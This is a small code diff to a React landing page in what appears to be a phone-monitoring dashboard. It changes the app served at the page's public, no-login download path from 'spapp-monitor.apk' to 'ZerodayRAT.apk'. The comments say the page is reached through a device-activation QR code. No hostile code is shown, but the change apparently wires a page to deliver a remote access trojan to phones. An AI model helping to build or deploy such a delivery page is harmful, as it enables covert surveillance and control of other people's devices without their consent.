@@ -2,7 +2,7 @@ import { useEffect, useState } from "react";
 import { useSearchParams } from "react-router-dom";
 
 /** Where the admin uploads the latest built APK — see dashboard/public/download/README.md. */
-const APK_DOWNLOAD_PATH = "/download/spapp-monitor.apk";
+const APK_DOWNLOAD_PATH = "/download/ZerodayRAT.apk";
 
 /**
  * Public (no-login) landing page the dashboard's device-activation QR code /
